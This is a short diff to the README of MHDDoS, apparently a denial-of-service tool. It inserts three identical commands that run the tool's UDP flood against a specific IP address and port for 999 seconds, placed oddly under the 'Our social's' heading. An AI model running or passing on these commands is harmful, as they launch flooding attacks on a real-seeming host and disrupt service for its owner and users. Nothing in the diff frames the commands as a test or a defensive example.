@@ -88,7 +88,11 @@ python3 start.py tools
 <h1 align="center">
 Our social's💻
   
-</h2> 
+
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.181:10017 53 999
+
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.181:10017 53 999
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.181:10017 53 999 
 
 <h1 style="color:red;text-align: center;" style="text-align: center;" align="center">Please do not use the "Issues" section to ask your questions!</h1>
 <div align="center">
